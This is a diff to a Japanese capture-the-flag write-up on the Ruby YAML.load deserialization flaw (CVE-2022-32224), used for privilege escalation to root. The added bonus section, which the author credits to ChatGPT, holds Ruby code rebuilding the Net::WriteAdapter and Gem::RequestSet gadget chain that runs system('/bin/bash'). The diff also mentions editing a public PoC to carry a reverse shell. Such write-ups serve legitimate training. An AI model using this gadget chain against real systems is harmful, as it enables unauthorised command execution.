@@ -180,7 +180,7 @@ gems_file.each do |file_name, file_version|
     end
 end
 ```
-が、Ruby3.1以前は`YAML.load()`でyamlを読み込むとクラスを生成してしまうのでそこからコマンド実行の脆弱性があるらしい（CVE-2022-32224）  
+が、Ruby3.1以前は`YAML.load()`でyamlを読み込むとReserializationしてそこからコマンド実行の脆弱性があるらしい（CVE-2022-32224）  
 またdependencies.ymlは絶対パスでないため、カレントディレクトリ内の攻撃者のyaml経由でコマンド実行できる  
 [PoC](https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml)があるので、git_setでリバースシェルコマンドに編集
 ```yml
@@ -275,4 +275,45 @@ uid=0(root) gid=0(root) groups=0(root)
 root@precious:/home/henry# cat /root/root.txt
 cat /root/root.txt
 6afa1a7ac857a74c60f00f3f28d18f32
+```
+
+
+## おまけ
+ちなみに、PoCのyamlを逆serializationした模倣rubyをチャットGPTさんに聞いてみました
+```ruby
+require 'rubygems'
+require 'yaml'
+require 'net/http'
+
+# 実際に呼び出される可能性のあるRubyコード（再現）
+
+# ① system("/bin/bash") を実行するための構造
+# ↓この Net::WriteAdapter は Kernel に system を送る
+inner_adapter = Net::WriteAdapter.new(Kernel, :system)
+
+# ② GitSet として `/bin/bash` を持っているリクエストセット
+request_set = Gem::RequestSet.new
+request_set.instance_variable_set(:@sets, inner_adapter)
+request_set.instance_variable_set(:@git_set, "/bin/bash")
+
+# ③ 外側の adapter が `resolve` メソッドを呼ぶと → request_set.system("/bin/bash")
+outer_adapter = Net::WriteAdapter.new(request_set, :resolve)
+
+# ④ Net::BufferedIO の debug_output に outer_adapter を渡す
+buffered_io = Net::BufferedIO.new(StringIO.new(""))
+buffered_io.instance_variable_set(:@debug_output, outer_adapter)
+
+# ⑤ buffered_io.debug_output.method_id == :resolve
+# ⑥ buffered_io.debug_output.socket → request_set
+# ⑦ request_set.sets = Net::WriteAdapter(socket: Kernel, method_id: :system)
+# ⑧ request_set.git_set = "/bin/bash"
+# ↓
+# resolve() を呼ぶと内部で次が実行される
+buffered_io.debug_output.socket.sets.send(
+  buffered_io.debug_output.socket.sets.instance_variable_get(:@method_id),
+  buffered_io.debug_output.socket.git_set
+)
+
+# ↑ 実際にはこれが以下のように展開される：
+# Kernel.send(:system, "/bin/bash")
 ```
